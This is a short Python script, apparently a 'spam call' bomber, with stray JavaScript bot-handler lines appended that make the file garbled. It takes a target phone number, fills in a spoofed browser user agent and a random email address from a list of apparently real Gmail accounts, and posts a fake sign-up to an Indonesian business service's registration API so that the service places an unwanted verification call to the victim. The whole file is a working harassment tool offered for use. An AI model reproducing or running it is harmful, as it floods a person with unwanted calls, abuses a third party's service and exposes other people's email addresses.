import os,sys,time,requests,random,json
from requests import post

nomor = sys.argv[1]
ua=random.choice(["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815","Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"])
mal=random.choice(["putrahanandafadhil@gmail.com","margeng84@gmail.com","ganzpaling@gmail.com","tololbet615@gmail.com","gblkbngt9171@gmail.com","ammarburhanudinafis@gmail.com","Dewvrak12@gmail.com","sdeam00@gmail.com","Hellooo00@gmail.com","Thortheman9514@gmail.com","Thortheman9514@gmail.com","Aqwdwsdf4@gmail.com","usniecakir9@gmail.com","Tiktok850077@gmail.com","ganksterkingx1@gmail.com","fha_melegim@gmail.com","yuurayuzakiri@gmail.com","javierzada59@gmail.com","dodijavier2@gmail.com","padilploject@gmail.com","fadhilhananda@gmail.com","fadilsauzu527@gmail.com","Rio444007@gmail.com"])
head={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json", "content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":ua,"sec-ch-ua-platform":"Android","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
dat=json.dumps({"name":"AmmarExecuted","email":mal,"password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":2})
pos=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=head,data=dat).text
if "Registration succes." in pos:
	print (f"[✓] Sukses Spam Call")
else:
	print (f"[❌] Gagal Spam Call")

handler.command = ['call']
handler.tags = ['teemux']
handler.help = ['call']

handler.owner = true

export default handler
